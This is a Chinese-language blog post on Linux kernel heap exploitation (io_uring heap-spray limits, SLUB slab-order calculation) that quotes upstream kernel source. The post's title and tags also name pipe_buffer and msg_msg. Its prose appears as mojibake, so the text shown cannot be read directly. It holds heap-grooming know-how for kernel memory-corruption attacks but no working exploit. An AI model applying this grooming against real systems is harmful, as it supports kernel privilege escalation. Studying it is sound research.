<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="196082">
    
    <title>
        
            å‘pipe_bufferè¯´yesï¼ |
        
        196082&#39;s blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    
        <link rel="shortcut icon" href="/images/ufo.ico">
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/fontawesome.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/regular.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/solid.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/brands.min.css">
    
    <script class="keep-theme-configurations">
    const KEEP = window.KEEP || {}
    KEEP.hexo_config = {"hostname":"196082.github.io","root":"/","language":"zh-CN","path":"search.json"}
    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"196082's blog","author":196082,"avatar":"/images/ling.JPG","logo":"/images/ling.JPG","favicon":"/images/ufo.ico"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":false,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":"æµ…æµ…æ›´æ–°åšå®¢ä¸€ä¸‹å§~","category":true,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":false,"custom_badge":"æ…¢æ…¢å¥½èµ·æ¥"},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":true,"img_link":"/images/reward.jpg","text":"æ¿€åŠ±ç‰›é©¬ï¼ŒåŠ é€Ÿåˆ›ä½œï¼","icon":"fa-solid fa-mug-hot"},"img_align":"center"},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"valine","valine":{"appid":"OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz","appkey":"C672AAYGXMkHxztf8ntdLShs","server_urls":null,"placeholder":"ğŸ˜œè‹¥æœ‰é—®é¢˜è¯·å„ä½å¤§å¸ˆå‚…ç•™è¨€è¯„è®º"},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.36"},"waline":{"server_url":null,"reaction":false,"version":"3.2.1"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":true},"lazyload":{"enable":true},"cdn":{"enable":true,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":true,"site_deploy":{"enable":true,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.2"}
    KEEP.language_ago = {"second":"%s ç§’å‰","minute":"%s åˆ†é’Ÿå‰","hour":"%s å°æ—¶å‰","day":"%s å¤©å‰","week":"%s å‘¨å‰","month":"%s ä¸ªæœˆå‰","year":"%s å¹´å‰"}
    KEEP.language_code_block = {"copy":"å¤åˆ¶ä»£ç ","copied":"å·²å¤åˆ¶","fold":"æŠ˜å ä»£ç å—","folded":"å·²æŠ˜å "}
    KEEP.language_copy_copyright = {"copy":"å¤åˆ¶ç‰ˆæƒä¿¡æ¯","copied":"å·²å¤åˆ¶","title":"åŸæ–‡æ ‡é¢˜","author":"åŸæ–‡ä½œè€…","link":"åŸæ–‡é“¾æ¥"}
  </script>
<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="196082's blog" type="application/atom+xml">
</head>


<body>
<div class="progress-bar-container">
    

    
</div>



<main class="page-container border-box">
    <!-- home first screen  -->
    

    <!-- page content -->
    <div class="page-main-content border-box">
        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="border-box header-content">
        <div class="left flex-start border-box">
            
                <a class="logo-image border-box" href="/">
                    <img src="/images/ling.JPG">
                </a>
            
            <a class="site-name border-box" href="/">
               196082&#39;s blog
            </a>
        </div>

        <div class="right border-box">
            <div class="pc border-box">
                <ul class="menu-list border-box">
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/">
                                
                                é¦–é¡µ
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/archives">
                                
                                å½’æ¡£
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/tags">
                                
                                æ ‡ç­¾
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/categories">
                                
                                åˆ†ç±»
                                
                            </a>
                            
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="menu-text-color fas search fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile border-box flex-start">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list border-box">
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
                            
                            é¦–é¡µ
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
                            
                            å½’æ¡£
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
                            
                            æ ‡ç­¾
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
                            
                            åˆ†ç±»
                        </a>
                        
                    </label>
                    
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle border-box">

            <div class="main-content border-box">
                

                    
<div class="fade-in-down-animation">
    <div class="post-page-container border-box">
        <div class="post-content-container border-box">
            

            <div class="post-content-bottom border-box">
                
                    <div class="post-title">
                        å‘pipe_bufferè¯´yesï¼
                    </div>
                

                
                    <div class="post-header border-box">
                        
                            <div class="avatar-box border-box">
                                <img src="/images/ling.JPG">
                            </div>
                        
                        <div class="info-box">
                            <div class="author border-box">
                                <span class="name">196082</span>
                                
                                    <span class="author-badge">æ…¢æ…¢å¥½èµ·æ¥</span>
                                
                            </div>
                            <div class="meta-info border-box">
                                

<div class="post-meta-info-container border-box post">
    <div class="post-meta-info border-box">
        

        
            <span class="meta-info-item post-create-date">
                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
                <span class="datetime">2023-05-24 16:39:35</span>
            </span>

            <span class="meta-info-item post-update-date">
                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
                <span class="datetime" data-updated="Wed Nov 29 2023 18:12:19 GMT+0800">2023-11-29 18:12:19</span>
            </span>
        

        
            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
                <ul class="post-category-ul">
                    
                            <li class="category-item"><a href="/categories/Linux-Kernel/">Linux Kernel</a></li>
                        
                    
                </ul>
            </span>
        

        
            <span class="post-tag meta-info-item border-box">
                <ul class="post-tag-ul">
                    
                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/msg-msg/">msg_msg</a></li>
                        
                    
                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/pipe-buffer/">pipe_buffer</a></li>
                        
                    
                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/io-uring/">io_uring</a></li>
                        
                    
                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E9%A1%B5%E7%BA%A7%E5%A0%86%E9%A3%8E%E6%B0%B4/">é¡µçº§å †é£æ°´</a></li>
                        
                    
                </ul>
            </span>
        

        
        
            <span class="meta-info-item post-wordcount">
                <i class="icon fas fa-file-word"></i>&nbsp;<span>11.8k å­—</span>
            </span>
        
        
            <span class="meta-info-item post-min2read">
                <i class="icon fas fa-clock"></i>&nbsp;<span>60 åˆ†é’Ÿ</span>
            </span>
        
        
            <span class="meta-info-item post-pv">
                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
            </span>
        
    </div>

    
</div>

                            </div>
                        </div>
                    </div>
                

                <div class="post-content keep-markdown-body ">
                    

                    
                         <p><img   src="/images/image-20230510125707322.png"  alt="image-20230510125707322"></p>
<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>èµ·å› æ˜¯å¢¨æ™šé¸¢å¤§ä½¬çš„ä¸€å¥å›å¤ï¼Œä¸è¿‡æˆ‘è¿™é‡Œè¿˜æ²¡å°è¯•æŒ–æ˜æ–°çš„ä¸œè¥¿ï¼Œæ›´å¤šçš„æ˜¯å¯¹å¢¨æ™šé¸¢ä½¬çš„å†…å®¹åšé€‚åˆè‡ªå·±ç†è§£çš„æ€»ç»“ã€‚å¯ä»¥çœ‹åˆ°æ ‡ç­¾ä¸­è¿˜æœ‰ä¸€ä¸ªä¸Šä¸€ç¯‡æ–‡ç« ä¸»è¦ä»‹ç»çš„<code>io_uring</code>ï¼Œè¿™é‡Œå°±å…ˆè¯´è¯´ã€‚</p>
<p><del>ä¸‡å­—è­¦å‘Šï¼ï¼ï¼</del></p>
<h2 id="io-uringåœ¨å †å–·ä¸­çš„å±€é™æ€§"><a href="#io-uringåœ¨å †å–·ä¸­çš„å±€é™æ€§" class="headerlink" title="io_uringåœ¨å †å–·ä¸­çš„å±€é™æ€§"></a>io_uringåœ¨å †å–·ä¸­çš„å±€é™æ€§</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __io_account_mem(struct user_struct *user, <span class="keyword">unsigned</span> <span class="keyword">long</span> nr_pages)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> page_limit, cur_pages, new_pages;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!nr_pages)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Don&#x27;t allow more pages than we can safely lock */</span></span><br><span class="line">	page_limit = rlimit(RLIMIT_MEMLOCK) &gt;&gt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">	cur_pages = atomic_long_read(&amp;user-&gt;locked_vm);</span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		new_pages = cur_pages + nr_pages;</span><br><span class="line">		<span class="keyword">if</span> (new_pages &gt; page_limit)</span><br><span class="line">			<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">	&#125; <span class="keyword">while</span> (!atomic_long_try_cmpxchg(&amp;user-&gt;locked_vm,</span><br><span class="line">					  &amp;cur_pages, new_pages));</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨æˆ‘è¿›è¡Œä¸€æ¬¡å †å–·è¿‡åï¼Œå¹¶ä½¿ç”¨updateå»ä¿®æ”¹å†…å®¹æ˜¯ä¼šè¿”å›é”™è¯¯-12ï¼Œåˆ™æ˜¯åœ¨ä¸Šé¢çš„å‡½æ•°ä¸­ï¼Œ<code>new_page</code>è¶…è¿‡äº†å¯ä»¥å®‰å…¨lockçš„pageæ•°é‡ï¼Œä¹Ÿå°±æ˜¯<code>new_pages &gt; page_limit</code>å¯¼è‡´çš„ã€‚</p>
<p>è€Œä¸Šé¢è¿™ä¸ªå‡½æ•°æœ€åˆæ˜¯ç”±<code>io_sqe_buffer_register</code>å‡½æ•°è°ƒç”¨çš„ï¼Œæ‰€ä»¥ä¸å¹¸çš„æ˜¯åœ¨å¯¹<code>io_uring</code>è¿›è¡Œåˆ†é…çš„æ—¶å€™å°±è¦å¼€å§‹è€ƒè™‘äº†ã€‚æ‰€ä»¥åœ¨æˆ‘ä»¬å¹³æ—¶åŠ¨ä¸åŠ¨å°±è¦é¢å¯¹4096æ¬¡ä¹‹ç±»çš„å¤§èŒƒå›´å †å–·æ—¶<code>io_uring</code>å°±æ˜¾å¾—æœ‰ç‚¹å„¿åŠ›ä¸ä»å¿ƒäº†ã€‚</p>
<p>ä¸è¿‡é™¤äº†ä»¥ä¸Šè¿™æ ·ä¸€ç‚¹ç¼ºç‚¹<code>io_uring</code>çš„è¡¨ç°ä¾æ—§æ˜¯ä»¤äººæ»¡æ„çš„ã€‚</p>
<h2 id="slabåˆ†é…æºç åˆ†æ"><a href="#slabåˆ†é…æºç åˆ†æ" class="headerlink" title="slabåˆ†é…æºç åˆ†æ"></a>slabåˆ†é…æºç åˆ†æ</h2><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œåˆ†é…slabçš„æœºåˆ¶ä¸º<code>buddy system</code>æœºåˆ¶è¿›è¡Œçš„ã€‚è€Œè¿›è¡Œåˆ†é…çš„æœ€ç»ˆå‡½æ•°ä¸º<code>alloc_slab_page</code>å‡½æ•°è¿›è¡Œåˆ†é…ï¼Œå¹¶ä¸”å¤§å®¶éƒ½çŸ¥é“<code>buddy system</code>åˆ†é…æ—¶å¤§å°ä¸º<code>PAGE_SIZE * pow(2,order)</code>ï¼Œæ‰€ä»¥orderçš„ç”±æ¥å°±æ˜¾å¾—å°¤ä¸ºé‡è¦äº†ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">oo_order</span><span class="params">(struct kmem_cache_order_objects x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> x.x &gt;&gt; OO_SHIFT;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct slab *<span class="title">alloc_slab_page</span><span class="params">(<span class="keyword">gfp_t</span> flags, <span class="keyword">int</span> node,</span></span></span><br><span class="line"><span class="params"><span class="function">		struct kmem_cache_order_objects oo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">folio</span> *<span class="title">folio</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> order = oo_order(oo);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (node == NUMA_NO_NODE)</span><br><span class="line">		folio = (struct folio *)alloc_pages(flags, order);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		folio = (struct folio *)__alloc_pages_node(node, flags, order);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!folio)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	slab = folio_slab(folio);</span><br><span class="line">	__folio_set_slab(folio);</span><br><span class="line">	<span class="comment">/* Make the flag visible before any changes to folio-&gt;mapping */</span></span><br><span class="line">	smp_wmb();</span><br><span class="line">	<span class="keyword">if</span> (page_is_pfmemalloc(folio_page(folio, <span class="number">0</span>)))</span><br><span class="line">		slab_set_pfmemalloc(slab);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> slab;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°åœ¨<code>alloc_slab_page</code>å‡½æ•°ä¸­ä½¿ç”¨orderæ˜¯åœ¨ooä¸­ï¼Œè€Œè¿™ä¸ªooè¿™æ—¶<code>kmem_cache</code>ç»“æ„ä½“ä¸­çš„æˆå‘˜ã€‚</p>
<h3 id="kmem-cache-create-usercopyæµç¨‹"><a href="#kmem-cache-create-usercopyæµç¨‹" class="headerlink" title="kmem_cache_create_usercopyæµç¨‹"></a>kmem_cache_create_usercopyæµç¨‹</h3><p><code>kmem_cache_create_usercopy</code>ç”¨æ¥æ³¨å†Œä¸€ä¸ªcacheï¼Œæ‰€ä»¥ä»–ä¹Ÿä¼šåˆ†é…ä¸€ä¸ªslabä¾›ä»–è‡ªå·±ä½¿ç”¨ï¼Œä¸è¿‡åˆ†é…çš„æ—¶é—´ç‚¹æ˜¯åœ¨è¿™ä¸ªcacheä¸­ç¬¬ä¸€æ¬¡ç”³è¯·objectçš„æ—¶å€™è§¦å‘çš„ã€‚è€Œ<code>kmem_cache_create_usercopy</code>å‡½æ•°ä¸»è¦æ˜¯å¯¹slabçš„åˆå§‹åŒ–ï¼Œå…¶ä¸­å°±åŒ…æ‹¬äº†æˆ‘ä»¬æ¯”è¾ƒå…³æ³¨çš„<code>order</code>äº†ã€‚</p>
<p>å› ä¸ºå‰åŠéƒ¨åˆ†çš„å‡½æ•°éƒ½æ²¡æœ‰ç›´æ¥å’Œ<code>order</code>äº§ç”Ÿå…³ç³»ï¼Œæ‰€ä»¥è¿™é‡Œå°±ç»™ä¸€ä¸‹å¤§å®¶è°ƒç”¨è¿ä¸è´´æºç å ç¯‡å¹…äº†ã€‚</p>
<p><code>kmem_cache_create_usercopy</code>&#x3D;&gt;<code>create_cache</code>&#x3D;&gt;<code>__kmem_cache_create</code>&#x3D;&gt;<code>kmem_cache_open</code>&#x3D;&gt;<code>calculate_sizes</code></p>
<h4 id="calculate-sizeså‡½æ•°"><a href="#calculate-sizeså‡½æ•°" class="headerlink" title="calculate_sizeså‡½æ•°"></a>calculate_sizeså‡½æ•°</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">calculate_sizes</span><span class="params">(struct kmem_cache *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">slab_flags_t</span> flags = s-&gt;flags;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> size = s-&gt;object_size;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> order;</span><br><span class="line"></span><br><span class="line">	... ...</span><br><span class="line">	order = calculate_order(size);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((<span class="keyword">int</span>)order &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	s-&gt;allocflags = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (order)</span><br><span class="line">		s-&gt;allocflags |= __GFP_COMP;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (s-&gt;flags &amp; SLAB_CACHE_DMA)</span><br><span class="line">		s-&gt;allocflags |= GFP_DMA;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (s-&gt;flags &amp; SLAB_CACHE_DMA32)</span><br><span class="line">		s-&gt;allocflags |= GFP_DMA32;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (s-&gt;flags &amp; SLAB_RECLAIM_ACCOUNT)</span><br><span class="line">		s-&gt;allocflags |= __GFP_RECLAIMABLE;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Determine the number of objects per slab</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	s-&gt;oo = oo_make(order, size);</span><br><span class="line">	s-&gt;min = oo_make(get_order(size), size);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> !!oo_objects(s-&gt;oo);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°åœ¨å‡½æ•°æœ€åè¿™éƒ¨åˆ†å°±æ˜¯å¯¹ooçš„èµ‹å€¼ï¼Œæ‰€ä»¥ç†æ‰€åº”å½“å»<code>calculate_order</code>ç†æ¸…é€»è¾‘ã€‚</p>
<h4 id="calculate-orderå‡½æ•°"><a href="#calculate-orderå‡½æ•°" class="headerlink" title="calculate_orderå‡½æ•°"></a>calculate_orderå‡½æ•°</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">calculate_order</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> order;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> min_objects;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> max_objects;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> nr_cpus;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Attempt to find best configuration for a slab. This</span></span><br><span class="line"><span class="comment">	 * works by first attempting to generate a layout with</span></span><br><span class="line"><span class="comment">	 * the best configuration and backing off gradually.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * First we increase the acceptable waste in a slab. Then</span></span><br><span class="line"><span class="comment">	 * we reduce the minimum objects required in a slab.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	min_objects = slub_min_objects;</span><br><span class="line">	<span class="keyword">if</span> (!min_objects) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Some architectures will only update present cpus when</span></span><br><span class="line"><span class="comment">		 * onlining them, so don&#x27;t trust the number if it&#x27;s just 1. But</span></span><br><span class="line"><span class="comment">		 * we also don&#x27;t want to use nr_cpu_ids always, as on some other</span></span><br><span class="line"><span class="comment">		 * architectures, there can be many possible cpus, but never</span></span><br><span class="line"><span class="comment">		 * onlined. Here we compromise between trying to avoid too high</span></span><br><span class="line"><span class="comment">		 * order on systems that appear larger than they are, and too</span></span><br><span class="line"><span class="comment">		 * low order on systems that appear smaller than they are.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		nr_cpus = num_present_cpus();</span><br><span class="line">		<span class="keyword">if</span> (nr_cpus &lt;= <span class="number">1</span>)</span><br><span class="line">			nr_cpus = nr_cpu_ids;</span><br><span class="line">		min_objects = <span class="number">4</span> * (fls(nr_cpus) + <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	max_objects = order_objects(slub_max_order, size);</span><br><span class="line">	min_objects = min(min_objects, max_objects);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (min_objects &gt; <span class="number">1</span>) &#123;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> fraction;</span><br><span class="line"></span><br><span class="line">		fraction = <span class="number">16</span>;</span><br><span class="line">		<span class="keyword">while</span> (fraction &gt;= <span class="number">4</span>) &#123;</span><br><span class="line">			order = calc_slab_order(size, min_objects,</span><br><span class="line">					slub_max_order, fraction);</span><br><span class="line">			<span class="keyword">if</span> (order &lt;= slub_max_order)</span><br><span class="line">				<span class="keyword">return</span> order;</span><br><span class="line">			fraction /= <span class="number">2</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		min_objects--;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We were unable to place multiple objects in a slab. Now</span></span><br><span class="line"><span class="comment">	 * lets see if we can place a single object there.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	order = calc_slab_order(size, <span class="number">1</span>, slub_max_order, <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">if</span> (order &lt;= slub_max_order)</span><br><span class="line">		<span class="keyword">return</span> order;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Doh this slab cannot be placed using slub_max_order.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	order = calc_slab_order(size, <span class="number">1</span>, MAX_ORDER, <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">if</span> (order &lt; MAX_ORDER)</span><br><span class="line">		<span class="keyword">return</span> order;</span><br><span class="line">	<span class="keyword">return</span> -ENOSYS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

